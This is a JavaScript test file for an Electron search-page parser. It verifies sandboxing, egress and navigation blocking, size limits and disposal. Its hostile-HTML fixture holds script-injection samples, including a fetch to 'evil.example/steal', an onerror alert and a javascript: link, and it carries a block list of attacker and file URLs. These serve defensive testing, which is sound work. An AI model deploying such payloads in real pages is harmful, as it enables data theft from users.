const test = require('node:test');
const assert = require('node:assert/strict');
const { EventEmitter } = require('node:events');
const vm = require('node:vm');

const { createInertDocumentParser } = require('../src/browser-search/parser');

const VOID_ELEMENTS = new Set(['area', 'base', 'br', 'col', 'embed', 'hr', 'img', 'input', 'link', 'meta', 'param', 'source', 'track', 'wbr']);

function decodeEntities(value) {
  return String(value || '').replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#39;/g, "'");
}

function parseAttributes(source) {
  const attributes = {};
  const pattern = /([:\w-]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>`]+)))?/g;
  let match;
  while ((match = pattern.exec(source))) attributes[match[1].toLowerCase()] = decodeEntities(match[2] ?? match[3] ?? match[4] ?? '');
  return attributes;
}

class FakeNode {
  constructor(tagName, attributes = {}) {
    this.tagName = tagName.toUpperCase();
    this.attributes = attributes;
    this.children = [];
    this.parentNode = null;
    this.removed = false;
  }

  appendChild(child) {
    if (child instanceof FakeNode) child.parentNode = this;
    this.children.push(child);
  }

  getAttribute(name) {
    return this.attributes[String(name).toLowerCase()] ?? null;
  }

  remove() {
    this.removed = true;
  }

  get textContent() {
    if (this.removed) return '';
    return this.children.map((child) => child instanceof FakeNode ? child.textContent : child).join('');
  }

  get innerText() {
    return this.textContent;
  }

  matches(selector) {
    const attributeMatch = /^([\w-]+)\[([\w-]+)\]$/.exec(selector);
    if (attributeMatch) return this.tagName === attributeMatch[1].toUpperCase() && this.getAttribute(attributeMatch[2]) !== null;
    return this.tagName === selector.toUpperCase();
  }

  querySelectorAll(selector) {
    const selectors = selector.split(',').map((part) => part.trim()).filter(Boolean);
    const matches = [];
    const visit = (node) => {
      if (node instanceof FakeNode) {
        if (!node.removed && selectors.some((part) => node.matches(part))) matches.push(node);
        node.children.forEach(visit);
      }
    };
    visit(this);
    return matches;
  }

  querySelector(selector) {
    return this.querySelectorAll(selector)[0] || null;
  }
}

class FakeDocument extends FakeNode {
  constructor(html) {
    super('#document');
    const root = new FakeNode('html');
    const head = new FakeNode('head');
    const body = new FakeNode('body');
    root.appendChild(head);
    root.appendChild(body);
    this.appendChild(root);
    this.head = head;
    this.body = body;
    this.parse(html);
  }

  parse(html) {
    const stack = [this.body];
    const tokenPattern = /<!--[\s\S]*?-->|<\/?([\w:-]+)([^>]*)>|([^<]+)/gi;
    let match;
    while ((match = tokenPattern.exec(String(html))) !== null) {
      if (match[0].startsWith('<!--')) continue;
      if (match[3]) {
        stack.at(-1).appendChild(decodeEntities(match[3]));
        continue;
      }
      const tagName = match[1].toLowerCase();
      if (match[0][1] === '/') {
        const index = [...stack].reverse().findIndex((node) => node.tagName === tagName.toUpperCase());
        if (index >= 0) stack.splice(stack.length - 1 - index);
        continue;
      }
      const node = new FakeNode(tagName, parseAttributes(match[2]));
      stack.at(-1).appendChild(node);
      if (!VOID_ELEMENTS.has(tagName)) stack.push(node);
    }
    const titles = this.body.querySelectorAll('title');
    titles.forEach((title) => {
      title.parentNode.children = title.parentNode.children.filter((child) => child !== title);
      this.head.appendChild(title);
    });
  }

  get title() {
    return this.head.querySelector('title')?.textContent || '';
  }

  querySelectorAll(selector) {
    if (selector === 'main, article, body') {
      return [this.body.querySelector('main'), this.body.querySelector('article'), this.body].filter(Boolean).slice(0, 1);
    }
    return super.querySelectorAll(selector);
  }
}

class FakeDOMParser {
  parseFromString(html, type) {
    assert.equal(type, 'text/html');
    return new FakeDocument(html);
  }
}

function createElectronFakes({ holdLoad = false, permissionCheckDuringLoad = false, executeJavaScript = (source) => {
  const result = vm.runInNewContext(source, { DOMParser: FakeDOMParser, URL });
  return JSON.parse(JSON.stringify(result));
} } = {}) {
  const calls = {
    windows: [],
    partitions: [],
    executeJavaScript: [],
    loads: [],
    clearStorageData: 0,
    beforeRequest: null,
    beforeRedirect: null,
    checkPermission: null,
    requestPermission: null,
    windowOpen: null,
    closeAllConnections: 0,
    serviceWorkers: [],
    releaseLoad: null,
  };
  const webRequest = {
    onBeforeRequest(...args) { calls.beforeRequest = args.at(-1); },
    onBeforeRedirect(...args) { calls.beforeRedirect = args.at(-1); },
  };
  const parserSession = new EventEmitter();
  parserSession.webRequest = webRequest;
  parserSession.setPermissionCheckHandler = (handler) => { calls.checkPermission = handler; };
  parserSession.setPermissionRequestHandler = (handler) => { calls.requestPermission = handler; };
  parserSession.clearStorageData = async () => { calls.clearStorageData += 1; };
  parserSession.serviceWorkers = {
    async getAllRunning() { return calls.serviceWorkers; },
    async terminate(id) {
      if (Array.isArray(calls.serviceWorkers)) {
        calls.serviceWorkers = calls.serviceWorkers.filter((worker) => worker.id !== id);
        return;
      }
      calls.serviceWorkers = Object.fromEntries(Object.entries(calls.serviceWorkers)
        .filter(([key, worker]) => key !== String(id) && worker?.id !== id));
    },
  };

  class FakeWebContents extends EventEmitter {
    getLastWebPreferences() {
      return this.preferences;
    }

    setWindowOpenHandler(handler) {
      calls.windowOpen = handler;
    }

    async executeJavaScript(source, userGesture) {
      calls.executeJavaScript.push({ source, userGesture });
      return executeJavaScript(source, userGesture);
    }

    loadURL(url) {
      calls.loads.push(url);
      if (permissionCheckDuringLoad) calls.checkPermission?.(null, 'notifications', '', {});
      if (this.holdLoad) return new Promise((resolve) => { calls.releaseLoad = () => { this.url = url; resolve(); }; });
      this.url = url;
      return Promise.resolve();
    }

    isDestroyed() {
      return this.destroyed;
    }

    getURL() {
      return this.url;
    }

    async closeAllConnections() {
      calls.closeAllConnections += 1;
    }
  }

  class FakeBrowserWindow {
    constructor(options) {
      this.options = options;
      this.webContents = new FakeWebContents();
      this.webContents.holdLoad = holdLoad;
      this.webContents.preferences = options.webPreferences;
      this.webContents.url = '';
      this.destroyed = false;
      calls.windows.push(this);
    }

    isDestroyed() {
      return this.destroyed;
    }

    destroy() {
      this.destroyed = true;
      this.webContents.destroyed = true;
    }
  }

  const session = {
    fromPartition(partition) {
      calls.partitions.push(partition);
      return parserSession;
    },
  };
  return { BrowserWindow: FakeBrowserWindow, session, calls, parserSession };
}

async function createParser(options) {
  const electron = createElectronFakes(options);
  return { ...electron, parser: await createInertDocumentParser(electron) };
}

test('parser creates a hidden about:blank-only window with isolated non-persistent settings', async () => {
  const { parser, calls } = await createParser();
  const preferences = calls.windows[0].options.webPreferences;

  assert.equal(calls.windows[0].options.show, false);
  assert.equal(preferences.nodeIntegration, false);
  assert.equal(preferences.contextIsolation, true);
  assert.equal(preferences.sandbox, true);
  assert.equal(preferences.webSecurity, true);
  assert.equal(preferences.webviewTag, false);
  assert.equal(preferences.devTools, false);
  assert.equal('preload' in preferences, false);
  assert.equal(calls.partitions.length, 1);
  assert.equal(calls.partitions[0].startsWith('persist:'), false);
  assert.equal(preferences.partition, calls.partitions[0]);
  assert.deepEqual(calls.loads, ['about:blank']);
  assert.equal(calls.windows[0].webContents.getURL(), 'about:blank');
  await parser.dispose();
});

test('parser ignores permission checks emitted while initializing about:blank', async () => {
  const { parser } = await createParser({ permissionCheckDuringLoad: true });

  assert.deepEqual(await parser.parsePage('<main>初始化完成</main>'), {
    title: '',
    text: '初始化完成',
  });
  await parser.dispose();
});

test('hostile HTML is parsed inertly and only normalized safe result fields escape', async () => {
  const { parser } = await createParser();
  const html = `
    <title>  搜尋頁  </title>
    <script>window.fetch('https://evil.example/steal')</script>
    <style>@import url(https://evil.example/style.css)</style>
    <img src="https://evil.example/image" onerror="window.alert(1)">
    <iframe src="https://evil.example/frame"></iframe>
    <form action="https://evil.example/form"><input value="secret"></form>
    <meta http-equiv="refresh" content="0;url=https://evil.example/refresh">
    <a href="javascript:alert(1)"><h3>不安全</h3></a>
    <a href="https://public.example/news#fragment"><h3>  安全標題  </h3> 摘要\n內容 </a>
    <a href="https://public.example/news#other"><h3>重複</h3>不應重複</a>
  `;

  assert.deepEqual(await parser.parseSearchResults(html, 'https://search.example/?q=test'), [{
    title: '安全標題',
    url: 'https://public.example/news',
    snippet: '安全標題 摘要 內容',
  }]);
  assert.deepEqual(await parser.parsePage(html), { title: '搜尋頁', text: '不安全 安全標題 摘要 內容 重複不應重複' });
});

test('parser enforces finite input, result-count, field, and page-text limits', async () => {
  const { parser } = await createParser();
  await assert.rejects(() => parser.parsePage('x'.repeat(1_000_001)), /parser-input-too-large/);

  const links = Array.from({ length: 60 }, (_, index) => `<a href="https://public.example/${index}"><h3>${'標題'.repeat(200)}</h3>${'摘要'.repeat(400)}</a>`).join('');
  const results = await parser.parseSearchResults(links, 'https://search.example/');
  assert.equal(results.length, 50);
  assert.equal(results[0].title.length, 240);
  assert.equal(results[0].snippet.length, 500);

  const page = await parser.parsePage(`<title>${'頁'.repeat(400)}</title><main>${'正文'.repeat(4_000)}</main>`);
  assert.equal(page.title.length, 240);
  assert.equal(page.text.length, 6_000);
});

test('parser denies requests, redirects, navigation, frames, popups, downloads, permissions, and worker egress', async () => {
  const { parser, calls, parserSession } = await createParser();
  const blockedUrls = [
    'http://evil.example/',
    'https://evil.example/',
    'ws://evil.example/',
    'wss://evil.example/',
    'file:///secret.txt',
    'data:text/html,evil',
    'blob:https://evil.example/id',
    'custom://evil.example/',
  ];
  for (const url of blockedUrls) {
    let response;
    calls.beforeRequest({ url, resourceType: 'other' }, (value) => { response = value; });
    assert.deepEqual(response, { cancel: true }, url);
  }
  for (const resourceType of ['worker', 'serviceWorker']) {
    let response;
    calls.beforeRequest({ url: `https://evil.example/${resourceType}`, resourceType }, (value) => { response = value; });
    assert.deepEqual(response, { cancel: true }, resourceType);
  }

  for (const eventName of ['will-navigate', 'will-frame-navigate', 'will-redirect']) {
    let prevented = false;
    calls.windows[0].webContents.emit(eventName, {
      url: 'https://evil.example/navigation',
      isMainFrame: eventName !== 'will-frame-navigate',
      preventDefault() { prevented = true; },
    });
    assert.equal(prevented, true, eventName);
  }
  assert.deepEqual(calls.windowOpen({ url: 'https://evil.example/popup' }), { action: 'deny' });

  let downloadPrevented = false;
  let downloadCancelled = false;
  parserSession.emit('will-download', {
    preventDefault() { downloadPrevented = true; },
  }, {
    getURL: () => 'https://evil.example/download',
    cancel() { downloadCancelled = true; },
  }, calls.windows[0].webContents);
  assert.equal(downloadPrevented, true);
  assert.equal(downloadCancelled, true);

  assert.equal(calls.checkPermission(null, 'geolocation', 'https://evil.example/', {}), false);
  let permissionGranted;
  calls.requestPermission(null, 'notifications', (value) => { permissionGranted = value; }, { requestingUrl: 'https://evil.example/' });
  assert.equal(permissionGranted, false);
  await assert.rejects(() => parser.parsePage('<main>late</main>'), /parser-egress-blocked/);
});

test('parser preserves cancellation and disposal while suppressing late evaluation results', async () => {
  let resolveEvaluation;
  const { parser, calls } = await createParser({ executeJavaScript: () => new Promise((resolve) => { resolveEvaluation = resolve; }) });
  const controller = new AbortController();
  const cancelled = parser.parsePage('<main>cancelled</main>', { signal: controller.signal });
  controller.abort();
  await assert.rejects(cancelled, /parser-cancelled/);
  resolveEvaluation({ title: 'late', text: 'late' });

  let resolveDisposedEvaluation;
  const disposed = await createParser({ executeJavaScript: () => new Promise((resolve) => { resolveDisposedEvaluation = resolve; }) });
  const pending = disposed.parser.parsePage('<main>disposed</main>');
  await disposed.parser.dispose();
  await assert.rejects(pending, /parser-disposed/);
  resolveDisposedEvaluation({ title: 'late', text: 'late' });
  assert.equal(disposed.calls.windows[0].destroyed, true);
  assert.equal(disposed.calls.clearStorageData, 1);
  assert.equal(disposed.calls.closeAllConnections, 1);
  await assert.rejects(() => disposed.parser.parsePage('<main>again</main>'), /parser-disposed/);
});

test('parser disposal terminates every running service worker before destroying the window', async () => {
  const electron = await createParser();
  electron.calls.serviceWorkers = { '1': { id: 'worker-1' }, '2': { id: 'worker-2' } };
  await electron.parser.dispose();
  assert.deepEqual(electron.calls.serviceWorkers, {});
  assert.equal(electron.calls.windows[0].destroyed, true);
});

test('parser rejects non-blank readiness, changed URL, and all remote URL schemes before evaluation', async () => {
  for (const url of ['https://evil.example/', 'file:///secret.txt', 'data:text/html,evil', 'blob:https://evil.example/id']) {
    const { parser, calls } = await createParser();
    calls.windows[0].webContents.url = url;
    await assert.rejects(() => parser.parsePage('<main>must not run</main>'), /parser-not-about-blank/);
    assert.equal(calls.executeJavaScript.length, 0);
    await parser.dispose();
  }
});

test('parser factory does not expose a parser before about:blank initialization completes', async () => {
  const electron = createElectronFakes({ holdLoad: true });
  let settled = false;
  const creating = createInertDocumentParser(electron).then(() => { settled = true; });
  await new Promise(setImmediate);
  assert.equal(settled, false);
  assert.deepEqual(electron.calls.loads, ['about:blank']);
  electron.calls.releaseLoad();
  await creating;
  assert.equal(settled, true);
});

test('parser rejects malformed or overlong result schemas instead of returning partial data', async () => {
  for (const result of [
    [{ title: 'ok', url: 'https://public.example/', snippet: 'ok', extra: 'nope' }],
    [{ title: 'ok', url: 'https://public.example/' }],
    [{ title: 'ok', url: 'http://public.example/', snippet: 'nope' }],
    { title: 'ok', text: 'ok', extra: 'nope' },
    { title: 'x'.repeat(241), text: 'ok' },
  ]) {
    const { parser } = await createParser({ executeJavaScript: () => result });
    await assert.rejects(() => Array.isArray(result)
      ? parser.parseSearchResults('<main>fixture</main>', 'https://search.example/')
      : parser.parsePage('<main>fixture</main>'), /parser-output-invalid/);
    await parser.dispose();
  }
});

test('every observed egress or navigation event poisons pending and future parsing', async () => {
  const eventCases = [
    ['beforeRequest', (calls) => calls.beforeRequest({ url: 'https://evil.example/', resourceType: 'other' }, () => {})],
    ['beforeRedirect', (calls) => calls.beforeRedirect({ url: 'https://evil.example/' })],
    ['will-navigate', (calls) => calls.windows[0].webContents.emit('will-navigate', { preventDefault() {} })],
    ['did-start-navigation', (calls) => calls.windows[0].webContents.emit('did-start-navigation', { url: 'https://evil.example/' })],
    ['did-navigate', (calls) => calls.windows[0].webContents.emit('did-navigate', { url: 'https://evil.example/' })],
    ['did-frame-navigate', (calls) => calls.windows[0].webContents.emit('did-frame-navigate', { url: 'https://evil.example/' })],
    ['did-navigate-in-page', (calls) => calls.windows[0].webContents.emit('did-navigate-in-page', { url: 'https://evil.example/' })],
    ['will-attach-webview', (calls) => calls.windows[0].webContents.emit('will-attach-webview', { preventDefault() {} })],
    ['new-window', (calls) => calls.windows[0].webContents.emit('new-window', { preventDefault() {} }, 'https://evil.example/')],
    ['download', (_calls, parserSession) => parserSession.emit('will-download', { preventDefault() {} }, { cancel() {} })],
    ['permission', (calls) => calls.checkPermission(null, 'geolocation', 'https://evil.example/', {})],
    ['worker-request', (calls) => calls.beforeRequest({ url: 'https://evil.example/worker', resourceType: 'worker' }, () => {})],
    ['shared-worker', (_calls, parserSession) => parserSession.emit('shared-worker-created')],
    ['service-worker', (_calls, parserSession) => parserSession.emit('service-worker-created')],
  ];

  for (const [name, trigger] of eventCases) {
    let resolveEvaluation;
    const electron = await createParser({ executeJavaScript: () => new Promise((resolve) => { resolveEvaluation = resolve; }) });
    const pending = electron.parser.parsePage('<main>no partial data</main>');
    await new Promise(setImmediate);
    trigger(electron.calls, electron.parserSession);
    resolveEvaluation({ title: 'late', text: 'late' });
    await assert.rejects(pending, /parser-egress-blocked/, name);
    await assert.rejects(() => electron.parser.parsePage('<main>future</main>'), /parser-egress-blocked/, name);
    await electron.parser.dispose();
  }
});
